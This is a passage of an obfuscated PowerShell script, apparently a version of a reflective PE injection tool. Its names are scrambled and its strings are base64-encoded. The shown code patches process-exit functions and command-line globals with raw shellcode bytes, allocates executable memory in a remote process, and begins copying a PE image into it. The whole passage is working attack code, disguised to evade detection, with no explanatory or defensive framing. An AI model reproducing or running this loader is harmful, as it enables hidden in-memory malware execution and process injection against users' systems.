		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/\__/\_/\/\___/=} -___/\/====\_/\_/== ${____/\/==\__/\/==}
		$Win32Functions.VirtualProtect.Invoke(${__/\/==\_____/=\_}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]${_/\/=\/\/\/\/==\/}, [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
		[UInt32]${_/\/=\/\/\/\/==\/} = 0
		${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${/=\/\___/\_/\/\__}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\/=\/\/\/\/==\/})
		if (${_/\/=\_/\/===\__/} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/\_/\_/\_/\_/\__} = ${/=\/\___/\_/\/\__}
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${___/===\_____/=\_} -___/\/====\_/\_/== ${_/\_/\_/\_/\_/\__}
		${_/\_/\_/\_/\_/\__} = _/=\___/\_/\__/\/\ ${_/\_/\_/\_/\_/\__} (${___/===\_____/=\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\_/\_/=\/=\/\_}, ${_/\_/\_/\_/\_/\__}, $false)
		${_/\_/\_/\_/\_/\__} = _/=\___/\_/\__/\/\ ${_/\_/\_/\_/\_/\__} ${_/=\__/=\/=\_/=\/}
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/\__/\_/\/\___/=} -___/\/====\_/\_/== ${_/\_/\_/\_/\_/\__}
		$Win32Functions.VirtualProtect.Invoke(${/=\/\___/\_/\/\__}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]${_/\/=\/\/\/\/==\/}, [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
		${/=\_/===\__/\/==\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${/=\___/==\_/\__/\} in ${/=\_/===\__/\/==\})
		{
			[IntPtr]${__/==\/======\_/=} = $Win32Functions.GetModuleHandle.Invoke(${/=\___/==\_/\__/\})
			if (${__/==\/======\_/=} -ne [IntPtr]::Zero)
			{
				[IntPtr]${/=\_/=\/=\/\/\/=\} = $Win32Functions.GetProcAddress.Invoke(${__/==\/======\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${/==\_/=\/====\__/} = $Win32Functions.GetProcAddress.Invoke(${__/==\/======\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${/=\_/=\/=\/\/\/=\} -eq [IntPtr]::Zero -or ${/==\_/=\/====\__/} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${__/===\/=\____/\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/===\/\/\___/\})
				${/=\/=\/\_/======\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/===\/\/\___/\})
				${_/====\__/==\_/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\_/=\/====\__/}, [Type][IntPtr])
				${/===\/\/\/\_/\_/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_/=\/=\/\/\/=\}, [Type][IntPtr])
				${____/=\__/\____/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\__/=\/=\_/=\/})
				${/\______/==\/==\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\__/=\/=\_/=\/})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/====\__/==\_/\/}, ${____/=\__/\____/=}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\/\/\/\_/\_/\}, ${/\______/==\/==\/}, $false)
				${__/==\____/\/=\/\} += ,(${/==\_/=\/====\__/}, ${____/=\__/\____/=}, ${_/=\__/=\/=\_/=\/})
				${__/==\____/\/=\/\} += ,(${/=\_/=\/=\/\/\/=\}, ${/\______/==\/==\/}, ${_/=\__/=\/=\_/=\/})
				${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${/==\_/=\/====\__/}, [UInt32]${_/=\__/=\/=\_/=\/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\/=\/\/\/\/==\/})
				if (${_/\/=\_/\/===\__/} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/===\/=\____/\_}, ${/==\_/=\/====\__/}, $false)
				$Win32Functions.VirtualProtect.Invoke(${/==\_/=\/====\__/}, [UInt32]${_/=\__/=\/=\_/=\/}, [UInt32](${_/\/=\/\/\/\/==\/}), [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
				${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${/=\_/=\/=\/\/\/=\}, [UInt32]${_/=\__/=\/=\_/=\/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\/=\/\/\/\/==\/})
				if (${_/\/=\_/\/===\__/} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/=\/\_/======\}, ${/=\_/=\/=\/\/\/=\}, $false)
				$Win32Functions.VirtualProtect.Invoke(${/=\_/=\/=\/\/\/=\}, [UInt32]${_/=\__/=\/=\_/=\/}, [UInt32](${_/\/=\/\/\/\/==\/}), [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
			}
		}
		${__/==\____/\/=\/\} = @()
		${__/=\__/\_/\/\/\_} = @() 
		[IntPtr]${/=\/\/====\__/==\} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${/=\/\/====\__/==\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${_/\___/=\__/=\___} = $Win32Functions.GetProcAddress.Invoke(${/=\/\/====\__/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${_/\___/=\__/=\___} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${__/=\__/\_/\/\/\_} += ${_/\___/=\__/=\___}
		[IntPtr]${/=\_/\_____/\__/\} = $Win32Functions.GetProcAddress.Invoke(${___/\/\_/\__/=\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${/=\_/\_____/\__/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${__/=\__/\_/\/\/\_} += ${/=\_/\_____/\__/\}
		[UInt32]${_/\/=\/\/\/\/==\/} = 0
		foreach (${____/\___/\_/\/==} in ${__/=\__/\_/\/\/\_})
		{
			${/==\/=\/\___/\/\/} = ${____/\___/\_/\/==}
			[Byte[]]${___/===\_____/=\_} = @(0xbb)
			[Byte[]]${_/\__/\_/\/\___/=} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${_/=\__/=\/=\_/=\/} -eq 8)
			{
				[Byte[]]${___/===\_____/=\_} = @(0x48, 0xbb)
				[Byte[]]${_/\__/\_/\/\___/=} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${___/=\_/\/======\} = @(0xff, 0xd3)
			${__/==\/\/\__/=\__} = ${___/===\_____/=\_}.Length + ${_/=\__/=\/=\_/=\/} + ${_/\__/\_/\/\___/=}.Length + ${_/=\__/=\/=\_/=\/} + ${___/=\_/\/======\}.Length
			[IntPtr]${_/=\/====\/======} = $Win32Functions.GetProcAddress.Invoke(${___/\/\_/\__/=\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${_/=\/====\/======} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${____/\___/\_/\/==}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${_/\/=\/\/\/\/==\/})
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${__/\/\/\__/=\_/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/==\/\/\__/=\__})
			$Win32Functions.memcpy.Invoke(${__/\/\/\__/=\_/\/}, ${____/\___/\_/\/==}, [UInt64]${__/==\/\/\__/=\__}) | Out-Null
			${__/==\____/\/=\/\} += ,(${____/\___/\_/\/==}, ${__/\/\/\__/=\_/\/}, ${__/==\/\/\__/=\__})
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${___/===\_____/=\_} -___/\/====\_/\_/== ${/==\/=\/\___/\/\/}
			${/==\/=\/\___/\/\/} = _/=\___/\_/\__/\/\ ${/==\/=\/\___/\/\/} (${___/===\_____/=\_}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\_/==\_/\/\/\/=}, ${/==\/=\/\___/\/\/}, $false)
			${/==\/=\/\___/\/\/} = _/=\___/\_/\__/\/\ ${/==\/=\/\___/\/\/} ${_/=\__/=\/=\_/=\/}
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/\__/\_/\/\___/=} -___/\/====\_/\_/== ${/==\/=\/\___/\/\/}
			${/==\/=\/\___/\/\/} = _/=\___/\_/\__/\/\ ${/==\/=\/\___/\/\/} (${_/\__/\_/\/\___/=}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/====\/======}, ${/==\/=\/\___/\/\/}, $false)
			${/==\/=\/\___/\/\/} = _/=\___/\_/\__/\/\ ${/==\/=\/\___/\/\/} ${_/=\__/=\/=\_/=\/}
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${___/=\_/\/======\} -___/\/====\_/\_/== ${/==\/=\/\___/\/\/}
			$Win32Functions.VirtualProtect.Invoke(${____/\___/\_/\/==}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]${_/\/=\/\/\/\/==\/}, [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
		}
		echo ${__/==\____/\/=\/\}
	}
	Function __/====\_/\/==\___
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${_/==\____/==\__/==},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${_/\/=\/\/\/\/==\/} = 0
		foreach (${__/=\/===\/=\___/} in ${_/==\____/==\__/==})
		{
			${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${__/=\/===\/=\___/}[0], [UInt32]${__/=\/===\/=\___/}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${_/\/=\/\/\/\/==\/})
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${__/=\/===\/=\___/}[0], ${__/=\/===\/=\___/}[1], [UInt64]${__/=\/===\/=\___/}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${__/=\/===\/=\___/}[0], [UInt32]${__/=\/===\/=\___/}[2], [UInt32]${_/\/=\/\/\/\/==\/}, [Ref]${_/\/=\/\/\/\/==\/}) | Out-Null
		}
	}
	Function _/==\/\__/\__/====
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/==\_/=\/\/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${___/==\_/\/\_/\_/=}
		)
		$Win32Types = __/\_/====\/=\__/=
		$Win32Constants = __/=\/==\_/==\/=\/
		${__/\/=\/\_/=\_/=\_} = __/\_/\/\/==\___/\ -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${/=\/==\/==\_/\/=\} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${____/=\/\/====\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/==\/==\_/\/=\}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${____/=\/\/====\_/}.NumberOfNames; ${/=\/\___/========}++)
		{
			${/==\_/=\/\/\/=\__} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) (${____/=\/\/====\_/}.AddressOfNames + (${/=\/\___/========} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${_/=\/=\__/\/\_/=\} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\_/=\/\/\/=\__}, [Type][UInt32]))
			${__/====\_/=\/===\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_/=\/=\__/\/\_/=\})
			if (${__/====\_/=\/===\} -ceq ${___/==\_/\/\_/\_/=})
			{
				${/===\______/\/\_/} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) (${____/=\/\/====\_/}.AddressOfNameOrdinals + (${/=\/\___/========} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${/==\____/\_/\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/===\______/\/\_/}, [Type][UInt16])
				${/==\/=\_/==\/\/=\} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) (${____/=\/\/====\_/}.AddressOfFunctions + (${/==\____/\_/\_/=\} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${_/\__/\___/\_/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/=\_/==\/\/=\}, [Type][UInt32])
				return _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) (${_/\__/\___/\_/=\/})
			}
		}
		return [IntPtr]::Zero
	}
	Function __/\/===\____/\/=\
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_/========\__/\/==},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${_____/==\____/\/=\},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${__/\____/\/===\_/\}
		)
		${_/=\__/=\/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = __/=\/==\_/==\/=\/
		$Win32Functions = _/=\/===\/\/\/\___
		$Win32Types = __/\_/====\/=\__/=
		${_____/\_/==\_____} = $false
		if ((${__/\____/\/===\_/\} -ne $null) -and (${__/\____/\/===\_/\} -ne [IntPtr]::Zero))
		{
			${_____/\_/==\_____} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${__/\/=\/\_/=\_/=\_} = __/\/\_/\/====\_/= -_/========\__/\/== ${_/========\__/\/==} -Win32Types $Win32Types
		${_/=\__/\/=\__/\_/\} = ${__/\/=\/\_/=\_/=\_}.OriginalImageBase
		${/=\_/\____/====\/} = $true
		if (([Int] ${__/\/=\/\_/=\_/=\_}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${/=\_/\____/====\/} = $false
		}
		${_/\_/==\______/==} = $true
		if (${_____/\_/==\_____} -eq $true)
		{
			${___/\/\_/\__/=\/=} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${/====\__/==\__/==} = $Win32Functions.GetProcAddress.Invoke(${___/\/\_/\__/=\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${/====\__/==\__/==} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${_/\/\/\_/===\/=\_} = $false
			${_/\/=\_/\/===\__/} = $Win32Functions.IsWow64Process.Invoke(${__/\____/\/===\_/\}, [Ref]${_/\/\/\_/===\/=\_})
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${_/\/\/\_/===\/=\_} -eq $true) -or ((${_/\/\/\_/===\/=\_} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${_/\_/==\______/==} = $false
			}
			${/=\/=\/\_/\_/=\/\} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${/=\/=\/\_/\_/=\/\} = $false
			}
			if (${/=\/=\/\_/\_/=\/\} -ne ${_/\_/==\______/==})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${_/\_/==\______/==} = $false
			}
		}
		if (${_/\_/==\______/==} -ne ${__/\/=\/\_/=\_/=\_}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${/==\/\_/==\/\__/\} = [IntPtr]::Zero
		if (([Int] ${__/\/=\/\_/=\_/=\_}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuAA=='))) -WarningAction Continue
			[IntPtr]${/==\/\_/==\/\__/\} = ${_/=\__/\/=\__/\_/\}
		}
		${__/\/\/==\_/=\/\/=} = [IntPtr]::Zero				
		${_/==\/\/\___/\/==} = [IntPtr]::Zero		
		if (${_____/\_/==\_____} -eq $true)
		{
			${__/\/\/==\_/=\/\/=} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${__/\/=\/\_/=\_/=\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${_/==\/\/\___/\/==} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, ${/==\/\_/==\/\__/\}, [UIntPtr]${__/\/=\/\_/=\_/=\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${_/==\/\/\___/\/==} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${/=\_/\____/====\/} -eq $true)
			{
				${__/\/\/==\_/=\/\/=} = $Win32Functions.VirtualAlloc.Invoke(${/==\/\_/==\/\__/\}, [UIntPtr]${__/\/=\/\_/=\_/=\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${__/\/\/==\_/=\/\/=} = $Win32Functions.VirtualAlloc.Invoke(${/==\/\_/==\/\__/\}, [UIntPtr]${__/\/=\/\_/=\_/=\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${_/==\/\/\___/\/==} = ${__/\/\/==\_/=\/\/=}
		}
		[IntPtr]${___/\/\/=\_/\____} = _/=\___/\_/\__/\/\ (${__/\/\/==\_/=\/\/=}) ([Int64]${__/\/=\/\_/=\_/=\_}.SizeOfImage)
		if (${__/\/\/==\_/=\/\/=} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${_/========\__/\/==}, 0, ${__/\/\/==\_/=\/\/=}, ${__/\/=\/\_/=\_/=\_}.SizeOfHeaders) | Out-Null
